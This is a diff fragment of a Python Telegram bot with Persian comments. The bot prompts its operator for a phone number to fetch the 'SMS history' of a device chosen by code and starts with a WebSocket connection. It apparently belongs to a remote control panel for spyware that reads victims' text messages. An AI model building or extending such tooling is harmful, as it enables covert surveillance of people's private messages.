             msg = bot.edit_message_text(f"📨 Please enter the phone number to get SMS history for device <code>{set_code}</code>:\n(Example: 09123456789)", chat_id, message_id, parse_mode='HTML')
             bot.register_next_step_handler(msg, process_sms_history_number, set_code, message_id)
@@ -1764,6 +1759,7 @@ def callback_handler(call):
 # ============================================================
 # اجرای ربات
 # ============================================================
+
 def run_bot():
     cleanup_thread = start_cleanup_thread()
     logger.info("🤖 Bot started with WebSocket connection.")
